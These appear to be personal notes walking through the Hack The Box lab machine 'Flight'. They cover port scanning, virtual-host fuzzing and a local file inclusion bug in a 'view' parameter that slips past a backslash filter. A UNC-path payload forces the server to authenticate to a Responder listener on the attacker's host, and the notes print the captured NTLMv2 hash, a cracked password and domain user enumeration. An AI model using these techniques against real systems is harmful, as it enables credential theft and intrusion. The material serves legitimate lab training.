https://app.hackthebox.com/machines/Flight

```
nmap -sCV -v -p- -T4 10.129.21.199 -oA nmap/flight
...
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 08:27:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-20T08:28:04
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```



```
<!DOCTYPE html>
<html lang="en">
<head>
<title>g0 Aviation</title>
<meta charset="utf-8">
<link rel="stylesheet" href="css/reset.css" type="text/css" media="all">
<link rel="stylesheet" href="css/layout.css" type="text/css" media="all">
<link rel="stylesheet" href="css/style.css" type="text/css" media="all">
<script type="text/javascript" src="js/jquery-1.4.2.js" ></script>
<script type="text/javascript" src="js/cufon-yui.js"></script>
<script type="text/javascript" src="js/cufon-replace.js"></script>
<script type="text/javascript" src="js/Myriad_Pro_italic_600.font.js"></script>
<script type="text/javascript" src="js/Myriad_Pro_italic_400.font.js"></script>
<script type="text/javascript" src="js/Myriad_Pro_400.font.js"></script>
<!--[if lt IE 9]>
<script type="text/javascript" src="js/ie6_script_other.js"></script>
<script type="text/javascript" src="js/html5.js"></script>
<![endif]-->
</head>
<body id="page1">
<!-- START PAGE SOURCE -->
<div class="body1">
  <div class="main">
    <header>
      <div class="wrapper">
        <h1><a href="index.html" id="logo">g0</a><span id="slogan">International Travel</span></h1>
        <div class="right">
          <nav>
            <ul id="top_nav">
              <li><a href="#"><img src="images/img1.gif" alt=""></a></li>
              <li><a href="#"><img src="images/img2.gif" alt=""></a></li>
              <li class="bg_none"><a href="#"><img src="images/img3.gif" alt=""></a></li>
            </ul>
          </nav>
          <nav>
            <ul id="menu">
              <li id="menu_active"><a href="index.html">Home</a></li>
              <li><a href="#">Our Aircraft</a></li>
              <li><a href="#">Safety</a></li>
              <li><a href="#">Charters</a></li>
              <li><a href="#">Contacts</a></li>
            </ul>
          </nav>
        </div>
      </div>
    </header>
  </div>
</div>
<div class="main">
  <div id="banner">
    <div class="text1"> COMFORT<span>Guaranteed</span>
      <p>g0 is the world's largest aerospace company and leading manufacturer of commercial jetliners, defense, space and security systems, and service provider of aftermarket support.</p>
    </div>
    <a href="#" class="button_top">Order Tickets Online</a></div>
</div>
<div class="main">
  <section id="content">
    <article class="col1">
      <div class="pad_1">
        <h2>Your Flight Planner</h2>
        <form id="form_1" action="#" method="post">
          <div class="wrapper pad_bot1">
            <div class="radio marg_right1">
              <input type="radio" name="name1">
              Round Trip<br>
              <input type="radio" name="name1">
              One Way </div>
            <div class="radio">
              <input type="radio" name="name1">
              Empty-Leg<br>
              <input type="radio" name="name1">
              Multi-Leg </div>
          </div>
          <div class="wrapper"> Leaving From:
            <div class="bg">
              <input type="text" class="input input1" value="Enter City or Airport Code" onBlur="if(this.value=='') this.value='Enter City or Airport Code'" onFocus="if(this.value =='Enter City or Airport Code' ) this.value=''">
            </div>
          </div>
          <div class="wrapper"> Going To:
            <div class="bg">
              <input type="text" class="input input1" value="Enter City or Airport Code" onBlur="if(this.value=='') this.value='Enter City or Airport Code'" onFocus="if(this.value =='Enter City or Airport Code' ) this.value=''">
            </div>
          </div>
          <div class="wrapper"> Departure Date and Time:
            <div class="wrapper">
              <div class="bg left">
                <input type="text" class="input input2" value="mm/dd/yyyy " onBlur="if(this.value=='') this.value='mm/dd/yyyy '" onFocus="if(this.value =='mm/dd/yyyy ' ) this.value=''">
              </div>
              <div class="bg right">
                <input type="text" class="input input2" value="12:00am" onBlur="if(this.value=='') this.value='12:00am'" onFocus="if(this.value =='12:00am' ) this.value=''">
              </div>
            </div>
          </div>
          <div class="wrapper"> Return Date and Time:
            <div class="wrapper">
              <div class="bg left">
                <input type="text" class="input input2" value="mm/dd/yyyy " onBlur="if(this.value=='') this.value='mm/dd/yyyy '" onFocus="if(this.value =='mm/dd/yyyy ' ) this.value=''">
              </div>
              <div class="bg right">
                <input type="text" class="input input2" value="12:00am" onBlur="if(this.value=='') this.value='12:00am'" onFocus="if(this.value =='12:00am' ) this.value=''">
              </div>
            </div>
          </div>
          <div class="wrapper">
            <p>Passenger(s):</p>
            <div class="bg left">
              <input type="text" class="input input2" value="# passengers" onBlur="if(this.value=='') this.value='# passengers'" onFocus="if(this.value =='# passengers' ) this.value=''">
            </div>
            <a href="#" class="button2">go!</a> </div>
        </form>
        <h2>Recent News</h2>
        <p class="under"><a href="#" class="link1">Nemo enim ipsam voluptatem quia</a><br>
          November 5, 2010</p>
        <p class="under"><a href="#" class="link1">Voluptas aspernatur autoditaut fjugit</a><br>
          November 1, 2010</p>
        <p><a href="#" class="link1">Sed quia consequuntur magni</a><br>
          October 23, 2010</p>
      </div>
    </article>
    <article class="col2 pad_left1">
      <h2>Welcome to our Website!</h2>
      <p class="color1">As Italy's biggest manufacturing exporter, the company supports airlines and allied government customers in more than 150 countries.</p>

      <div class="wrapper pad_bot2"> <a href="#" class="button1">Reservation</a> <a href="#" class="button2">Fleet</a> </div>
      <div class="wrapper">
        <article class="cols">
          <h2>Apply to out Team!</h2>
          <p><strong>We are Hiring</strong> We are looking for talented engineers specializing in aeronautics. Quick apply to our team by going to the contact page.</p>
        </article>
        <div class="box1">
          <div class="pad_1">
            <div class="wrapper">
            </div>
          </div>
        </div>
      </div>
    </article>
  </section>
</div>
<div class="body2">
  <div class="main">
    <footer>
      <div class="footerlink">
        <p class="lf">Copyright 2022 <a href="#">flight.htb</a> - All Rights Reserved</p>
        <p class="rf">Designed by <a href="https://twitter.com/Geiseric4" class="twitter">Geiseric</a> & <a href="https://twitter.com/Janit10043163" class="twitter">JDgodd</a></p>
        <div style="clear:both;"></div>
      </div>
    </footer>
  </div>
</div>
<script type="text/javascript"> Cufon.now(); </script>
<!-- END PAGE SOURCE -->
</body>
</html>
```

```

smbclient -L //10.129.21.199 -N                                           
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.21.199 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.flight.htb" -u http://flight.htb -fl 155
```


```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.flight.htb" -u http://flight.htb -fl 155

...
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 155
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 16ms]
:: Progress: [110000/110000] :: Job [1/1] :: 380 req/sec :: Duration: [0:03:07] :: Errors: 0 ::

```
found " school " as a virtual host (not a subdomain, as it doesn't use a different IP)

sudo nano /etc/hosts 
10.129.228.120 flight.htb school.flight.htb



---------


On Linux, try to read `/etc/passwd`. 

as this is Windows, try 
`C:\windows\system32\drivers\etc\hosts`, 
but it returns an error:

## Suspicious Activity Blocked!

just having just `view=\` results in the same blocked response. `view=.` returns nothing, but anything with `..` in it also results in the blocked message.



Filtering  is in place to prevent such attacks. 

Typically filters detect the use of the \ character. 

On Windows, we can still access a path if we replace \ with /

Trying `/` instead of `\`, ensure an absolute path, and it works:

```
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```

```
http://school.flight.htb/index.php?view=C:/Windows/win.ini

confirms that we can read files on the machine
```


------

Despite the filter at first glance looking secure, the developer actually missed a crucial part of the `file_get_contents` blacklist. When blacklisting against accessing `UNC` paths through the parameter with `\\`, they missed out by not explicitly blocking its counter part `//`. This is probably because the developer forgot that Windows allows both backslashes or forward slashes when resolving UNC paths, to ensure compatibility with different protocols.

As described [here](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#lfi) on HackTricks, if we host an `SMB` server that requires `NTLM` authentication and force the Windows machine to connect back and attempt to authenticate to it using the `UNC` path `//10.10.14.16/reverse`, we will capture the username and `NTLMv2` password hash of the account running the Apache process on the underlying Windows system when it connects.

### Hash capturing[](https://rootjaxk.github.io/posts/Flight/#hash-capturing)

One really easy way to host an SMB server that meets our authentication requirements is to start [Responder](https://github.com/SpiderLabs/Responder). We can start it on our `tun0` interface over the HTB VPN:


------

![[win-ini.png]]


The fact that we can see contents of `win.ini` in browser tells us that the website has a **Local File Inclusion (LFI)** vulnerability.

### 1. The Manipulation of the Parameter

In the URL `index.php?view=C:/Windows/win.ini`, the `view` parameter is designed to tell the PHP script which file to display on the page.

- **Intended Use:** The developer likely intended for us to see files like `home.php` or `about.php`.

- **The Exploit:** By changing the value to an absolute Windows path (`C:/Windows/win.ini`), we force the web server to reach outside of the website's folder and grab a sensitive system file instead.
### 2. Evidence: `win.ini`

Text starting with `; for 16-bit app support`
is the standard content of the `win.ini` file, which exists on almost every Windows installation.

- Since this file is **not** part of the website’s source code, the only way it could appear in browser is if the web server’s backend (PHP) physically opened that system file and printed the text onto the screen.

### 3. Why this is a "Proof of Concept"

Pentesters use `C:\Windows\win.ini` (on Windows) or `/etc/passwd` (on Linux) as "canary" files. 
Because these files are world-readable and have a very predictable structure, seeing them confirms:

1. **Input is unmapped:** The server isn't validating that your input stays within the "web" folder.

2. **File System Access:** web service account has permissions to read files elsewhere on the `C:` drive.

3. **Path Traversal:** You have successfully "traversed" from the web root to the system root.

-----

Now knowing we can read files, try to read other sensitive files that might contain credentials or configuration details, such as:

- **Web Configs:** `C:\inetpub\wwwroot\web.config`

- **Log files:** To look for usernames or paths.

- **UNC Redirection:** Since this is a Windows box, try to change that path to a **UNC path** pointing to our Kali machine 
  (`\\KALI_IP\share\test`) to see if the server tries to authenticate, allowing us to capture a hash.

use Responder to intercept any authentication that might occur

```
responder -I tun0 -v
```

Then, we send following payload.

```
http://school.flight.htb/index.php?view=//kali-IP/htb

``` 

------

```
http://school.flight.htb/index.php?view=//10.10.14.213/
```

----
troubleshooting why responder is not getting a response

run python http server to test port 80
but it will only trigger a 
```
[ HTTP ] Sending NTLM authentication request to 10.129.228.120
```
without SMB response

```
http://school.flight.htb/index.php?view=http://10.10.14.213/test
```


-----

```
http://school.flight.htb/index.php?view=//10.10.14.213/any/thing

```

----

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.228.120 - - [22/Apr/2026 11:29:56] code 404, message File not found
10.129.228.120 - - [22/Apr/2026 11:29:56] "GET /test HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.

┌──(lanc3㉿kali)-[~]
└─$ sudo responder -I tun0 -v
...

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.213]
    Responder IPv6             [dead:beef:2::10d3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-UARO1F9L9NA]
    Responder Domain Name      [28RJ.LOCAL]
    Responder DCE-RPC Port     [46984]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                         

[HTTP] Sending NTLM authentication request to 10.129.228.120

[HTTP] Sending NTLM authentication request to 10.129.228.120


[HTTP] Sending NTLM authentication request to 10.129.228.120
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:ea3e2e6997116d6e:E92AE1F5FAFD48E393D0C3595C96D1A4:0101000000000000000DEFAC4BD2DC01CB40E860483A256E00000000020008003200380052004A0001001E00570049004E002D005500410052004F003100460039004C0039004E00410004003400570049004E002D005500410052004F003100460039004C0039004E0041002E003200380052004A002E004C004F00430041004C00030014003200380052004A002E004C004F00430041004C00050014003200380052004A002E004C004F00430041004C0007000800000DEFAC4BD2DC0106000400020000000800300030000000000000000000000000300000FEC8C9A64F6766EF555B593B08F28BBF76A009D4945247E88FC9A19462FF98C00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310033000000000000000000 
```

```
nano flight-hash.txt             
...
┌──(lanc3㉿kali)-[~]
└─$ cat flight-hash.txt
svc_apache::flight:ea3e2e6997116d6e:E92AE1F5FAFD48E393D0C3595C96D1A4:0101000000000000000DEFAC4BD2DC01CB40E860483A256E00000000020008003200380052004A0001001E00570049004E002D005500410052004F003100460039004C0039004E00410004003400570049004E002D005500410052004F003100460039004C0039004E0041002E003200380052004A002E004C004F00430041004C00030014003200380052004A002E004C004F00430041004C00050014003200380052004A002E004C004F00430041004C0007000800000DEFAC4BD2DC0106000400020000000800300030000000000000000000000000300000FEC8C9A64F6766EF555B593B08F28BBF76A009D4945247E88FC9A19462FF98C00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310033000000000000000000 
...
...
┌──(lanc3㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt flight-hash.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:07 DONE (2026-04-22 13:43) 0.1302g/s 1388Kp/s 1388Kc/s 1388KC/s SAILE11463..S@29$JL
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```


clear text password for user svc_apache = 
```
S@Ss!K@*t13
```

```
smbclient -L //10.129.228.120 -U 'svc_apache%S@Ss!K@*t13'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
        Web             Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.120 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

![[smbmap-flight.png]]

```
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
Impacket v0.13.0.dev0+20251002.85540.fc92f471 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at flight.htb
[*] StringBinding ncacn_np:flight.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: flight\Administrator (SidTypeUser)
501: flight\Guest (SidTypeUser)
502: flight\krbtgt (SidTypeUser)
512: flight\Domain Admins (SidTypeGroup)
513: flight\Domain Users (SidTypeGroup)
514: flight\Domain Guests (SidTypeGroup)
515: flight\Domain Computers (SidTypeGroup)
516: flight\Domain Controllers (SidTypeGroup)
517: flight\Cert Publishers (SidTypeAlias)
518: flight\Schema Admins (SidTypeGroup)
519: flight\Enterprise Admins (SidTypeGroup)
520: flight\Group Policy Creator Owners (SidTypeGroup)
521: flight\Read-only Domain Controllers (SidTypeGroup)
522: flight\Cloneable Domain Controllers (SidTypeGroup)
525: flight\Protected Users (SidTypeGroup)
526: flight\Key Admins (SidTypeGroup)
527: flight\Enterprise Key Admins (SidTypeGroup)
553: flight\RAS and IAS Servers (SidTypeAlias)
571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
572: flight\Denied RODC Password Replication Group (SidTypeAlias)
1000: flight\Access-Denied Assistance Users (SidTypeAlias)
1001: flight\G0$ (SidTypeUser)
1102: flight\DnsAdmins (SidTypeAlias)
1103: flight\DnsUpdateProxy (SidTypeGroup)
1602: flight\S.Moon (SidTypeUser)
1603: flight\R.Cold (SidTypeUser)
1604: flight\G.Lors (SidTypeUser)
1605: flight\L.Kein (SidTypeUser)
1606: flight\M.Gold (SidTypeUser)
1607: flight\C.Bum (SidTypeUser)
1608: flight\W.Walker (SidTypeUser)
1609: flight\I.Francis (SidTypeUser)
1610: flight\D.Truff (SidTypeUser)
1611: flight\V.Stevens (SidTypeUser)
1612: flight\svc_apache (SidTypeUser)
1613: flight\O.Possum (SidTypeUser)
1614: flight\WebDevs (SidTypeGroup)

```

with a list of valid usernames, try a password spray against the usernames to see if the password for svc_apache is re-used.